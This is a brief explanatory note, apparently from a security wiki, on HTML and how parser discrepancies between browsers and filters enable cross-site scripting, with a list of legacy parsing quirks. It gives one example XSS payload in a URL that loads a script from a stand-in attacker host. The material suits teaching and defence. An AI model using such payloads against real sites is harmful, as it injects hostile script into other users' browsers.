# HTML

_Hypertext Markup Language_ is the standard markup language for documents displayed in a web-browser.

Web browsers receive HTML documents rom a web server or from local storage, and render the documents into multimedia web pages.

#### What's the role of HTML in security?

HTML can __embed programs__ written in a scriptining language such as JavaScript, which affects the behavior and content of web pages.

## Security

#### Parsing

HTML should be parsed according to the relevant spec, generally HTML5 now. It's often not just parsed by your browser but also Web-Application Firewalls and other filters.

> Wherever there's a discrepancy in how two items parse things, there's probably a vulnerability.

Let's see a canonical example.

You go to `http://example.com/vulnerable?name=<script/xss%20src=http://evilsite.com/my.js>` and it generates:

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Vulnerable page named <script/xss src=...></title>
    </head>
</html>
```

A bad XSS filter on the web application may not see hat as a script tag due to it being a `script/xss` tag. Firefox's HTML parser, for example, treats the slash as a whitespace, enabling the attack!

#### Legacy Parsing

Due to decades of bad HTML, browsers are quite excellent at cleaning up after authors, and these conditions are often exploitable:

* `<script>` tag on its own wil automatically be closed at the ond of the page.
* A tag missing is closing angle bracket wil automatically by closed by the angle bracket of the next tag on the page.